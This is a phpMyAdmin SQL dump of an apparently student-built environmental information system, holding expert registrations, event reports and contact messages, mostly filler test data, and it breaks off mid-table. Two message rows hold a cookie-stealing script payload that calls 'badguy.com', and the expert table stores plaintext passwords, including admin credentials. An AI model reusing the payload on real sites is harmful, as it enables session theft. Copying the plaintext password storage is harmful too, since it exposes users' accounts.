-- phpMyAdmin SQL Dump
-- version 4.5.4.1deb2ubuntu2
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Jun 12, 2017 at 02:01 PM
-- Server version: 5.7.18-0ubuntu0.16.04.1
-- PHP Version: 7.0.15-0ubuntu0.16.04.4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `eis`
--

-- --------------------------------------------------------

--
-- Table structure for table `accessdata`
--

CREATE TABLE `accessdata` (
  `id` int(11) NOT NULL,
  `requestid` varchar(5) DEFAULT NULL,
  `info` varchar(80) DEFAULT NULL,
  `status` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `accessdata`
--

INSERT INTO `accessdata` (`id`, `requestid`, `info`, `status`) VALUES
(40, '893', 'Environmental Impact Assessment Statement', NULL),
(41, '893', 'Environmental Audit Report', NULL),
(42, '893', 'Environmental Monitoring Report', NULL),
(43, '893', 'Record of Decision (ROD) for Environmental Impact Assessment Approvals', NULL),
(44, '893', 'Certificate for Environmental Impact Assessment', NULL),
(45, '893', 'Environmental Impact Assessment Experts (Individuals)', NULL),
(46, '893', 'Environmental Impact Assessment Statement', NULL),
(47, '893', 'Environmental Audit Report', NULL),
(48, '893', 'Environmental Monitoring Report', NULL),
(49, '893', 'Record of Decision (ROD) for Environmental Impact Assessment Approvals', NULL),
(50, '893', 'Certificate for Environmental Impact Assessment', NULL),
(51, '893', 'Environmental Impact Assessment Experts (Individuals)', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `accessdata_translator`
--

CREATE TABLE `accessdata_translator` (
  `id` int(11) NOT NULL,
  `requestid` varchar(5) DEFAULT NULL,
  `info` varchar(80) DEFAULT NULL,
  `status` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `accessdata_translator`
--

INSERT INTO `accessdata_translator` (`id`, `requestid`, `info`, `status`) VALUES
(1, '1', 'Project Brief', NULL),
(2, '1', 'Environmental Impact Assessment Statement', NULL),
(3, '1', 'Environmental Audit Report', NULL),
(4, '1', 'Environmental Monitoring Report', NULL),
(5, '1', 'Record of Decision (ROD) for Environmental Impact Assessment Approvals', NULL),
(6, '1', 'Certificate for Environmental Impact Assessment', NULL),
(7, '1', 'Environmental Impact Assessment Experts (Individuals)', NULL),
(8, '1', 'Environmental Impact Assessment Statement', NULL),
(9, '1', 'Environmental Audit Report', NULL),
(10, '1', 'Environmental Monitoring Report', NULL),
(11, '1', 'Record of Decision (ROD) for Environmental Impact Assessment Approvals', NULL),
(12, '1', 'Certificate for Environmental Impact Assessment', NULL),
(13, '1', 'Environmental Impact Assessment Experts (Individuals)', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `accessinfo`
--

CREATE TABLE `accessinfo` (
  `id` int(11) NOT NULL,
  `fname` varchar(255) DEFAULT NULL,
  `mname` varchar(15) DEFAULT NULL,
  `lname` varchar(255) DEFAULT NULL,
  `address` varchar(30) DEFAULT NULL,
  `email` varchar(20) DEFAULT NULL,
  `tele` varchar(54) DEFAULT NULL,
  `faxno` varchar(54) DEFAULT NULL,
  `prof` varchar(50) DEFAULT NULL,
  `fname2` varchar(15) DEFAULT NULL,
  `mname2` varchar(15) DEFAULT NULL,
  `lname2` varchar(20) DEFAULT NULL,
  `address2` varchar(20) DEFAULT NULL,
  `tele2` varchar(20) DEFAULT NULL,
  `faxno2` varchar(20) DEFAULT NULL,
  `email2` varchar(20) DEFAULT NULL,
  `design` varchar(20) DEFAULT NULL,
  `title` varchar(50) DEFAULT NULL,
  `author` varchar(30) DEFAULT NULL,
  `year` varchar(5) DEFAULT NULL,
  `dateof` varchar(14) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `accessinfo`
--

INSERT INTO `accessinfo` (`id`, `fname`, `mname`, `lname`, `address`, `email`, `tele`, `faxno`, `prof`, `fname2`, `mname2`, `lname2`, `address2`, `tele2`, `faxno2`, `email2`, `design`, `title`, `author`, `year`, `dateof`) VALUES
(893, 'Miraji', 'Issa', 'Kakoi', 'mirajissa6@gmail.com', 'P O Box 2336', '0788221859', '+255483t5649', 'CoICT', 'UDSM', '', '', 'info@udsm.ac.tz', '255859656', '25585539898', 'P O Box 233526', 'University', 'Environmental  Audit In Africa', 'Prof. M. Maige', '2017', '05/06/2017');

-- --------------------------------------------------------

--
-- Table structure for table `alert`
--

CREATE TABLE `alert` (
  `id` int(7) NOT NULL,
  `message` varchar(255) DEFAULT NULL,
  `sender` varchar(5) DEFAULT NULL,
  `dateof` varchar(12) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `alert`
--

INSERT INTO `alert` (`id`, `message`, `sender`, `dateof`) VALUES
(1, 'HELLO', '6490', '10/04/2017'),
(2, 'My FIRST Alert', '9490', '10/04/2017'),
(3, 'bv', '9099', '10/04/2017'),
(4, 'Well Come to the 70th Anniversary', '6469', '10/04/2017'),
(5, 'guy', '6469', '11/04/2017'),
(6, 'vfgtr', '6469', '11/04/2017'),
(7, 'nh', '6469', '12/04/2017'),
(8, 'Captured The Event at Mwembechai', '6469', '12/04/2017');

-- --------------------------------------------------------

--
-- Table structure for table `district`
--

CREATE TABLE `district` (
  `id` int(11) NOT NULL,
  `rid` int(11) NOT NULL,
  `dname` varchar(100) NOT NULL,
  `covarage` varchar(50) DEFAULT NULL,
  `population` varchar(50) DEFAULT NULL,
  `activity` varchar(50) DEFAULT NULL,
  `remarks` varchar(200) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `district`
--

INSERT INTO `district` (`id`, `rid`, `dname`, `covarage`, `population`, `activity`, `remarks`) VALUES
(1, 3, 'Temeke', '782', '4062497', 'Business', NULL),
(2, 2, 'Ilemela', '432', '543268', 'Fishing', NULL),
(3, 3, 'Kinondoni', '397', '34097821', 'Business', NULL),
(4, 2, 'Nyamagana', '972', '8235727', 'Business', NULL),
(5, 3, 'Kigamboni', '2365', '2393245', 'Business', ' '),
(6, 4, 'Kasulu', '890', '12', 'Agriculture', ' '),
(7, 6, 'Mbeya Mjini', '3425', '3452', 'Business', 'Noted '),
(8, 5, 'Ngalenaro', '2317', '23416', 'Tourism', 'Hello ');

-- --------------------------------------------------------

--
-- Table structure for table `event`
--

CREATE TABLE `event` (
  `id` int(11) NOT NULL,
  `rname` varchar(20) DEFAULT NULL,
  `dname` varchar(20) DEFAULT NULL,
  `ward` varchar(30) DEFAULT NULL,
  `reporter` varchar(20) DEFAULT NULL,
  `reporterid` varchar(15) DEFAULT NULL,
  `agent` varchar(20) DEFAULT NULL,
  `location` varchar(20) DEFAULT NULL,
  `covarage` varchar(20) DEFAULT NULL,
  `period` varchar(20) DEFAULT NULL,
  `remarks` varchar(200) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL,
  `description` varchar(255) DEFAULT NULL,
  `reportdate` varchar(12) DEFAULT NULL,
  `attachment` blob
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `event`
--

INSERT INTO `event` (`id`, `rname`, `dname`, `ward`, `reporter`, `reporterid`, `agent`, `location`, `covarage`, `period`, `remarks`, `type`, `description`, `reportdate`, `attachment`) VALUES
(10, NULL, 'Ilala', NULL, 'Miraj', 'Pollution', 'Human', 'Buza', '5', '5', 'Reported', '', NULL, NULL, NULL),
(22, NULL, '', NULL, 'Miraj', 'Conservation', 'Human', 'Mbagala', '34', '100', 'Tree Plantation at Visiga Area ', '', NULL, NULL, NULL),
(25, NULL, 'Municipal of Ilala', NULL, 'Miraj', 'Pollution', 'Natural Calamity', 'Mvuti', '23', '23', 'Earth quake ', '', NULL, NULL, NULL),
(59, NULL, 'Bukoba', NULL, 'Miraj', 'Pollution', 'Natural Calamity', 'Bukoba Town', '39', '5', 'Earth quake about 5.3 richter', 'Land', NULL, '12/09/2016', NULL),
(93, NULL, 'saewr', NULL, 'Ali, Hajra', 'frteu', 'Individual', '', '', '', '', 'Land', NULL, '16/09/2016', NULL),
(97, NULL, 'IHIHHOO', NULL, 'vbvvb, bvb', '6410', 'Others', 'HO', 'OO', 'HOHO', 'HOO', 'Land', 'IHIHIHI', '10/04/2017', NULL),
(98, NULL, 'WAWAWA', NULL, 'MirajI Salum, Kakoi', '6469', 'Animal', 'WAWAWA', 'WAWAWA', 'AAWW', 'AWAWAWA', 'Noise', 'awawawa', '10/04/2017', NULL),
(99, 'Dar es Salaam', 'Kinondoni', 'Oysterbay', 'MirajI Salum, Kakoi', '6469', 'Human', '', '', '', '', 'Land', 'ghgghghg', '17/05/2017', NULL),
(100, 'Dar es Salaam', 'Temeke', 'Tandika', 'MirajI Salum, Kakoi', '6469', 'Human', '', '', '', '', 'Land', 'ghgghghg', '17/05/2017', NULL),
(101, 'Mwanza', 'Ilemela', 'Nyamanoro', 'MirajI Salum, Kakoi', '6469', 'Human', '', '8765', '', '', 'Land', 'jhjh', '17/05/2017', NULL),
(102, 'Mwanza', 'Ilemela', 'Nyamanoro', 'MirajI Salum, Kakoi', '6469', 'Human', '', '98753788777878', '', '', 'Land', 'ghghg', '17/05/2017', NULL),
(103, 'Dar es Salaam', 'Temeke', 'Tandika', 'MirajI Salum, Kakoi', '6469', 'Human', '', '1234567891234', '', '', 'Land', 'yuyyu', '17/05/2017', NULL),
(104, 'Dar es Salaam', 'Temeke', 'Tandika', 'ECO Company Limited,', '9490', 'Human', '', '86728', '76', 'jhu', 'Land', 'Vfreywysusux', '10/06/2017', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `excel`
--

CREATE TABLE `excel` (
  `id` int(3) NOT NULL,
  `name` varchar(30) DEFAULT NULL,
  `email` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `excel`
--

INSERT INTO `excel` (`id`, `name`, `email`) VALUES
(31, 'Asha Mwanne', 'am12@yhoo.com'),
(32, 'Alhaji Jumbe', 'jumbehaji@gmail.com'),
(33, 'Maryam Salum', 'mirmar@eis.org.tz'),
(34, 'Asmaa Idrissa', 'asmaai@gmail.com');

-- --------------------------------------------------------

--
-- Table structure for table `expert`
--

CREATE TABLE `expert` (
  `id` int(5) NOT NULL,
  `fname` varchar(50) DEFAULT NULL,
  `mname` varchar(54) DEFAULT NULL,
  `lname` varchar(54) DEFAULT NULL,
  `nationality` varchar(30) DEFAULT NULL,
  `pinno` varchar(50) DEFAULT NULL,
  `contactperson` varchar(50) DEFAULT NULL,
  `businessregno` varchar(50) DEFAULT NULL,
  `datereg` varchar(50) DEFAULT NULL,
  `address` varchar(50) DEFAULT NULL,
  `region` varchar(20) DEFAULT NULL,
  `tele` varchar(50) DEFAULT NULL,
  `faxno` varchar(50) DEFAULT NULL,
  `email` varchar(50) DEFAULT NULL,
  `spec` varchar(50) DEFAULT NULL,
  `qualif` varchar(100) DEFAULT NULL,
  `experience` varchar(50) DEFAULT NULL,
  `purpose` varchar(50) DEFAULT NULL,
  `role` varchar(20) DEFAULT NULL,
  `oldregno` varchar(50) DEFAULT NULL,
  `dateof` varchar(50) DEFAULT NULL,
  `position` varchar(100) DEFAULT NULL,
  `compname` varchar(100) DEFAULT NULL,
  `appldate` varchar(20) DEFAULT NULL,
  `username` varchar(50) DEFAULT NULL,
  `password` varchar(50) DEFAULT NULL,
  `status` varchar(10) DEFAULT 'WAITING...',
  `photo` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `expert`
--

INSERT INTO `expert` (`id`, `fname`, `mname`, `lname`, `nationality`, `pinno`, `contactperson`, `businessregno`, `datereg`, `address`, `region`, `tele`, `faxno`, `email`, `spec`, `qualif`, `experience`, `purpose`, `role`, `oldregno`, `dateof`, `position`, `compname`, `appldate`, `username`, `password`, `status`, `photo`) VALUES
(6410, 'Marco', 'Masembo', 'Masembo', 'Tanzanian', '12AT5212QW5SABZ', 'Prof. Kivaisi', 'UDSM', '12/9/1999', 'P.O Box 5682 Mara', 'Mara', '0762391809', '+25576374398', 'masembomarco@gmail.com', 'EIA', 'Phd in Environmental Issues', 'Working In UN', 'Reseach and Environment Invistigation', 'Idividual', '', '', 'Chair person', 'COICT', '07/04/2017', 'masembo', 'masembo', 'DENIED', '6410-erd.png'),
(6469, 'MirajI Salum', 'Issa', 'Kakoi', 'Tanzanian', 'A3161Y76CFH', 'Shahid Omary', 'Q234SK7V02J', '18 July 2015', 'PO Box 108  Mwanza', 'Mwanza', '0788221859', '+24487459837', 'mirajissa1@gmail.com', 'Audit', 'Master in Environmental Engineering', 'Working With NEMC two Years', 'Development', 'ADMIN', 'F327FOV935EW', '29 Nov 2012', '', '', '23/03/2017', 'admin', 'eisadmin', 'ACCEPTED', '6469-wp_20151103_029 1.jpg'),
(7981, 'nmnmn', '', '', '', 'mnmnm', 'mnm', 'nmnmn', 'mnmnm', 'mnmnm', 'Mwanza', 'nmnm', 'mnmnm', 'nmnmnm', 'nmnmn', 'mnmnm', 'mnmn', 'nmnmn', 'Firm', 'mnmnm', 'mnmnm', 'nmnmn', 'mnmnm', '08/05/2017', 'nmnmnm', 'nmnmnm', 'WAITING...', NULL),
(9099, 'Hajra', 'Faki', 'Ally', 'Tanzanian', '1BSS830MDS4', 'Mr. Masoud Mahundi', 'EIA130296BDK', '22 Feb 2007', 'P.O Box 3419 Dar es Salaam', 'Dar es Salaam', '0716431567', '+255677637679972', 'alihajra90@gmail.com', 'EIA', 'Barchelor of Science in Environmental Management', 'Four Years Working with ECO Company', 'For Environment Research Purposes', 'Firm', 'EW71K006FISH8', '18 Nov 1999', '', '', '10/04/2017', 'alihajra90@gmail.com', 'alihajra90@gmail.com', 'ACCEPTED', NULL),
(9490, 'ECO Company Limited', '', '', '', 'R841591DE', 'Mussa Mahundi', 'S65210GD32', '29 May 2014', 'PO Box 108  Mwanza', 'Mwanza', '+2554728478', '+24487459837', 'ecogroup12@eco.com', 'EIA', 'Phd In Environmental Issues', 'Four Years On Environmental Matters', 'Helping Others', 'Firm', 'E129034FK', '08 Jan 2008', 'Manager', 'Eco Company', '22/03/2017', 'user', 'eisuser', 'ACCEPTED', '9490-ud.png'),
(9912, 'Sleyum', 'Masoud', 'Masoud', 'Tanzanian', 'Q243V678LSF', 'Mr Mussa', '23LP57J19', '12/12/2016', 'P O Box 2345 Dar es SALAAM', 'Dar es Salaam', '0734183567', '+24539264390', '1234', 'sds', 'Audit', 'dsd', 'sd', 'Firm', 'sds', 'ds', 'sdsd', 'sd', '07/04/2017', 'masoud', 'masoud', 'ACCEPTED', '9912-ud.png'),
(9913, 'Sleyum2', 'Issa32', 'Masembo2', 'Tanzanian', '1BSS830MDS4', 'Sales', '23LP57J20', '12/12/2017', 'P O Box 2345 Dar es SALAAM', 'Mwanza', '734183568', '24487459838', 'mirajissa1@gmail.com1', 'Audit', 'Phd in Environmental Issues', 'Working With NEMC two Years', 'For Environment Research Purposes', 'Idividual', 'F327FOV935EW3', '12/12/2023', '', 'UDSM', '10/04/2020', 'eis', 'eis', 'WAITING...', '9913-ud.png'),
(9914, 'Sleyum3', 'Issa33', 'Masembo3', 'Tanzanian', '1BSS830MDS5', 'Espresso', '23LP57J21', '12/12/2018', 'P O Box 2345 Dar es SALAAM', 'Arusha', '734183569', '255677637679973', 'mirajissa1@gmail.com2', 'EIA', 'Master in Environmental Engineering', 'Four Years Working with ECO Company', 'Reseach and Environment Invistigation', 'Firm', 'EW71K006FISH8', '12/12/2024', '', '', '10/04/2021', 'eis', 'eis', 'DENIED', '9914-ud.png'),
(9915, 'Sleyum4', 'Issa34', 'Masembo4', 'Tanzanian', '1BSS830MDS6', 'Coffee', '23LP57J22', '12/12/2019', 'P O Box 2345 Dar es SALAAM', 'Kagera', '734183570', '24487459838', 'mirajissa1@gmail.com3', 'Audit', 'Barchelor of Science in Environmental Management', 'Working With NEMC two Years', 'Development', 'Idividual', 'E129034FKgf5', '12/12/2025', 'Manager', 'Eco Company', '10/04/2022', 'eis', 'eis', 'WAITING...', '9915-ud.png'),
(9916, 'Sleyum5', 'Issa35', 'Masembo5', 'Tanzanian', '1BSS830MDS7', 'Food/Beverage', '23LP57J23', '12/12/2020', 'P O Box 2345 Dar es SALAAM', 'Arusha', '734183571', '24539264391', 'mirajissa1@gmail.com4', 'EIA', 'Phd In Environmental Issues', 'Four Years Working with ECO Company', 'For Environment Research Purposes', 'Firm', 'F327FOV935EW4', '12/12/2026', 'Chair person', 'DUCE', '10/04/2023', 'eis', 'eis', 'WAITING...', '9916-ud.png'),
(9917, 'Sleyum6', 'Issa36', 'Masembo6', 'Tanzanian', '1BSS830MDS8', 'Merchandise', '23LP57J24', '12/12/2021', 'P O Box 2345 Dar es SALAAM', 'Mtwara', '734183572', '24487459839', 'mirajissa1@gmail.com5', 'Audit', 'Environmental Science.', 'Working With NEMC two Years', 'Reseach and Environment Invistigation', 'Idividual', 'EW71K006FISH9', '12/12/2027', '', 'UDSM', '10/04/2024', 'eis', 'eis', 'WAITING...', '9917-ud.png'),
(9918, 'Sleyum7', 'Issa37', 'Masembo7', 'Tanzanian', '1BSS830MDS9', 'Computer', '23LP57J25', '12/12/2022', 'P O Box 2345 Dar es SALAAM', 'Kagera', '734183573', '255677637679974', 'mirajissa1@gmail.com6', 'EIA', 'Phd in Environmental Issues', 'Four Years Working with ECO Company', 'Development', 'Firm', 'E129034FKgf6', '12/12/2028', '', '', '10/04/2025', 'eis', 'eis', 'WAITING...', '9918-ud.png'),
(9919, 'Sleyum8', 'Issa38', 'Masembo8', 'Tanzanian', '1BSS830MDS10', 'Total Sales', '23LP57J26', '12/12/2023', 'P O Box 2345 Dar es SALAAM', 'Morogoro', '734183574', '24487459839', 'mirajissa1@gmail.com7', 'Audit', 'Master in Environmental Engineering', 'Working With NEMC two Years', 'For Environment Research Purposes', 'Idividual', 'F327FOV935EW5', '12/12/2029', 'Manager', 'Eco Company', '10/04/2026', 'eis', 'eis', 'WAITING...', '9919-ud.png'),
(9920, 'Sleyum9', 'Issa39', 'Masembo9', 'Tanzanian', '1BSS830MDS11', 'Espenses', '23LP57J27', '12/12/2024', 'P O Box 2345 Dar es SALAAM', 'Arusha', '734183575', '24539264392', 'mirajissa1@gmail.com8', 'EIA', 'Barchelor of Science in Environmental Management', 'Four Years Working with ECO Company', 'Reseach and Environment Invistigation', 'Firm', 'EW71K006FISH10', '12/12/2030', 'Chair person', 'DUCE', '10/04/2027', 'eis', 'eis', 'REJECTED', '9920-ud.png'),
(9921, 'Sleyum10', 'Issa40', 'Masembo10', 'Tanzanian', '1BSS830MDS12', 'Cost of Goods', '23LP57J28', '12/12/2025', 'P O Box 2345 Dar es SALAAM', 'Tanga', '734183576', '24487459840', 'mirajissa1@gmail.com9', 'Audit', 'Phd In Environmental Issues', 'Working With NEMC two Years', 'Development', 'Idividual', 'E129034FKgf7', '12/12/2031', '', 'UDSM', '10/04/2028', 'eis', 'eis', 'REJECTED', '9921-ud.png'),
(9922, 'Sleyum11', 'Issa41', 'Masembo11', 'Tanzanian', '1BSS830MDS13', 'Income', '23LP57J29', '12/12/2026', 'P O Box 2345 Dar es SALAAM', 'Dar es Salaam', '734183577', '255677637679975', 'mirajissa1@gmail.com10', 'EIA', 'Environmental Science.', 'Four Years Working with ECO Company', 'For Environment Research Purposes', 'Firm', 'F327FOV935EW6', '12/12/2032', '', '', '10/04/2029', 'eis', 'eis', 'REJECTED', '9922-ud.png'),
(9923, 'Sleyum12', 'Issa42', 'Masembo12', 'Tanzanian', '1BSS830MDS14', 'Wage', '23LP57J30', '12/12/2027', 'P O Box 2345 Dar es SALAAM', 'Dar es Salaam', '734183578', '24487459840', 'mirajissa1@gmail.com11', 'Audit', 'Phd in Environmental Issues', 'Working With NEMC two Years', 'Reseach and Environment Invistigation', 'Idividual', 'EW71K006FISH11', '12/12/2033', 'Manager', 'Eco Company', '10/04/2030', 'eis', 'eis', 'REJECTED', '9923-ud.png'),
(9924, 'Sleyum13', 'Issa43', 'Masembo13', 'Tanzanian', '1BSS830MDS15', 'Internet', '23LP57J31', '12/12/2028', 'P O Box 2345 Dar es SALAAM', 'Mbeya', '734183579', '24539264393', 'mirajissa1@gmail.com12', 'EIA', 'Master in Environmental Engineering', 'Four Years Working with ECO Company', 'Development', 'Firm', 'E129034FKgf8', '12/12/2034', 'Chair person', 'DUCE', '10/04/2031', 'eis', 'eis', 'REJECTED', '9924-ud.png'),
(9925, 'Sleyum14', 'Issa44', 'Masembo14', 'Tanzanian', '1BSS830MDS16', 'Income', '23LP57J32', '12/12/2029', 'P O Box 2345 Dar es SALAAM', 'Kagera', '734183580', '24487459841', 'mirajissa1@gmail.com13', 'Audit', 'Barchelor of Science in Environmental Management', 'Working With NEMC two Years', 'For Environment Research Purposes', 'Idividual', 'F327FOV935EW7', '12/12/2035', '', 'UDSM', '10/04/2032', 'eis', 'eis', 'ACCEPTED', '9925-ud.png'),
(9926, 'Sleyum15', 'Issa45', 'Masembo15', 'Tanzanian', '1BSS830MDS17', 'Miscelaneous', '23LP57J33', '12/12/2030', 'P O Box 2345 Dar es SALAAM', 'Lindi', '734183581', '255677637679976', 'mirajissa1@gmail.com14', 'EIA', 'Phd In Environmental Issues', 'Four Years Working with ECO Company', 'Reseach and Environment Invistigation', 'Firm', 'EW71K006FISH12', '12/12/2036', '', '', '10/04/2033', 'eis', 'eis', 'ACCEPTED', '9926-ud.png');

-- --------------------------------------------------------

--
-- Table structure for table `message`
--

CREATE TABLE `message` (
  `message_id` int(11) NOT NULL,
  `msgfrom` varchar(200) DEFAULT NULL,
  `fullname` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL,
  `subject` varchar(30) NOT NULL,
  `message` varchar(1000) NOT NULL,
  `date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `message`
--

INSERT INTO `message` (`message_id`, `msgfrom`, `fullname`, `email`, `subject`, `message`, `date`) VALUES
(1, NULL, 'Ali, Hajra', 'mirajissa6@gmail.com', 'bvbvbv', 'Sorry am asking for the the Individual Access of information', '2017-05-14 04:06:16'),
(2, NULL, 'Miraji Issa', 'mirajissa6@gmail.com', 'Complaint', 'Am Failing to register , Your system is too busy to respond', '2017-05-13 04:39:16'),
(3, NULL, 'Miraji Issa', 'mirajissa6@gmail.com', 'Trouble', 'Am not interested', '2017-05-15 17:48:44'),
(4, NULL, 'Maryam Salu ', 'maryamsalum21@gmail.com', 'Help', 'I got a trouble with signing in(login) while I have an account!!\r\n\r\nPlease Help me', '2017-05-17 17:51:53'),
(5, NULL, 'TONNY', 'tonnyanthony@gmail.com', 'WellCome', 'Well come at our sity', '2017-05-30 18:48:51'),
(6, NULL, 'nj', 'mirajissa6@gmail.com', 'n', '<SCRIPT> window.open(http://badguy.com/info.pl?document.cookie </SCRIPT>', '2017-06-04 15:13:46'),
(7, NULL, 'nbn', 'nbnbn@m.m', 'nbnbn', 'bnbnb', '2017-06-04 15:14:25'),
(8, NULL, 'nbnb', 'bnnbb@n.m', 'nbn', '<SCRIPT> window.open(http://badguy.com/info.pl?document.cookie </SCRIPT>', '2017-06-04 15:14:58'),
(9, NULL, '234jud', 'm@er.co', '55455454545455445', 'hdgywu', '2017-06-05 05:45:04'),
(10, NULL, 'asd', 'nbnbn@m.m', '111', 'ewsdf', '2017-06-05 05:46:20');

-- --------------------------------------------------------

--
-- Table structure for table `newsletter`
--

CREATE TABLE `newsletter` (
  `id` int(4) NOT NULL,
  `news` varchar(255) DEFAULT NULL,
  `dateof` varchar(15) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `newsletter`
--

INSERT INTO `newsletter` (`id`, `news`, `dateof`, `userid`) VALUES
(1, 'Meeting on 05th June at Nkurumah Hall.\nPlease make sure you attend', '18/09/2016', NULL),
(3, 'Welcome to the Universal Environmental Summit, on 8th August 2017, at JNICC  Dar-es-Salaam ', '17/05/2017', 6469);

-- --------------------------------------------------------

--
-- Table structure for table `panel`
--

CREATE TABLE `panel` (
  `id` varchar(8) NOT NULL,
  `year` int(5) DEFAULT NULL,
  `total` int(5) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `panel`
--

INSERT INTO `panel` (`id`, `year`, `total`) VALUES
('#04D215', 2011, 310),
('#0D52D1', 2013, 240),
('#0D8ECF', 2012, 289),
('#2A0CD0', 2014, 211),
('#754DEB', 2017, 57),
('#8A0CCF', 2015, 180),
('#B0DE09', 2010, 430),
('#CD0D74', 2016, 90),
('#F8FF01', 2009, 517),
('#FCD202', 2008, 611),
('#FF0F00', 2005, 992),
('#FF6600', 2006, 805),
('#FF9E01', 2007, 700);

-- --------------------------------------------------------

--
-- Table structure for table `pdeia`
--

CREATE TABLE `pdeia` (
  `id` int(3) NOT NULL,
  `fname` varchar(30) DEFAULT NULL,
  `mname` varchar(50) DEFAULT NULL,
  `lname` varchar(50) DEFAULT NULL,
  `certficateno` varchar(30) DEFAULT NULL,
  `address` varchar(30) DEFAULT NULL,
  `tele` varchar(15) DEFAULT NULL,
  `fax` varchar(30) DEFAULT NULL,
  `email` varchar(30) DEFAULT NULL,
  `position` varchar(30) DEFAULT NULL,
  `behalf` varchar(30) DEFAULT NULL,
  `projectid` varchar(30) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `pdeia`
--

INSERT INTO `pdeia` (`id`, `fname`, `mname`, `lname`, `certficateno`, `address`, `tele`, `fax`, `email`, `position`, `behalf`, `projectid`) VALUES
(1, 'GHGH', 'HGHGH', 'GHGH', 'GHGHG', 'HGHGHG', 'HGHG', 'HGHGH', 'GHGHG', 'HGHGH', 'GHGHGH', 'P-6948'),
(2, 'EERTYYUVC', 'EDXDGFH', ' CGTYUHJJMNBC', 'UJJKMNBVF', 'IUKMMNVBGF', 'KMMBCGTFHU ', 'FGUJKM', 'FDGHYUJMMM', 'FHYHJJBCC', 'HHGTF', 'P-9662'),
(3, 'AAERSEYUJ', 'DFRJYFTKU', 'UKYHG', 'FTKFTYKU', 'UYUFRTRFT', 'RTTRRTYR', 'RTRTRTRTR', 'TRTRTRTR', 'TRTRTR', 'TTRRTRTR', 'P-8706'),
(4, 'bvb', 'bvbvv', 'vvb', 'vbvbvb', 'vbvbv', 'vbvbv', 'bvbvb', 'vbvbvb', 'bvbvb', 'vbvb', ''),
(5, 'weewew', 'wewewe', 'wewew', 'ewewew', 'ewewe', 'wewe', 'wewew', 'ewewe', 'ewewe', 'wewe', ''),
(6, 'eewewe', 'wrewrw', 'rwerwr', 'egt', 'etwsr', 'we', 'swg', 'ers', 'sr', 'sr', ''),
(7, 'mmnmn', 'mnmnm', 'nmnmnmnmn', 'nmnmnmnmnmmm', 'opqiouio', '04257715127', '26672767168', 'mnkk@ki', 'manager', 'you', 'P-5039'),
(8, '', '', '', '', '', '', '3254687143878', '', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `pdescription`
--

CREATE TABLE `pdescription` (
  `id` int(3) NOT NULL,
  `nature` varchar(30) DEFAULT NULL,
  `unitprocesses` varchar(50) DEFAULT NULL,
  `rawmat` varchar(200) DEFAULT NULL,
  `storage` varchar(100) DEFAULT NULL,
  `waste` varchar(100) DEFAULT NULL,
  `chemical` varchar(100) DEFAULT NULL,
  `source` varchar(50) DEFAULT NULL,
  `type` varchar(50) DEFAULT NULL,
  `quantity` varchar(30) DEFAULT NULL,
  `projectid` varchar(30) DEFAULT NULL,
  `title` varchar(100) DEFAULT NULL,
  `start` varchar(30) DEFAULT NULL,
  `duration` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `pdescription`
--

INSERT INTO `pdescription` (`id`, `nature`, `unitprocesses`, `rawmat`, `storage`, `waste`, `chemical`, `source`, `type`, `quantity`, `projectid`, `title`, `start`, `duration`) VALUES
(19, 'rerer', 'ererer', 'erere', 'rerere', 'rerer', 'ererer', 'erere', 'rerere', 'rere', 'P-9879', 'erere', 'rerere', 'rerere'),
(20, '', '', '', '', '', '', '', '', '', 'P-3384', '', '', ''),
(21, 'vbvbv', 'bvbvb', 'vbvbvb', 'vbvbv', 'bvbvb', 'vbvbvb', 'vbvb', 'vbvbv', 'bvbvb', 'P-6948', 'bvbvb', 'bvbv', 'vbvbvb'),
(22, 'Spatial', 'Udsm', 'coict', 'Godown', 'waste', 'qwert', 'QWERDASK', 'PDUET ', 'KJDBIW', 'P-9662', 'JEMA UDSM EVALUATION', '15/02/2017', '17 '),
(23, 'HGHGHGH', 'HGHGHGH', 'GHGHGH', 'GHGHGHG', 'HGHGHG', 'HGHGH', 'HGHGH', 'GHGH', 'GHGHG', 'P-8706', 'HHGHHGHG', 'HGHGHGH', 'HGHGHGHG'),
(24, 'bbvb', 'vbvbvb', 'bvbv', 'vbvbv', 'bvbvbv', 'bvbvb', 'bvbvb', 'vbvb', 'vbvbv', 'P-5039', 'bvbvb', 'vbvbv', '7676');

-- --------------------------------------------------------

--
-- Table structure for table `pimpacts`
--

CREATE TABLE `pimpacts` (
  `id` int(3) NOT NULL,
  `construction` varchar(240) DEFAULT NULL,
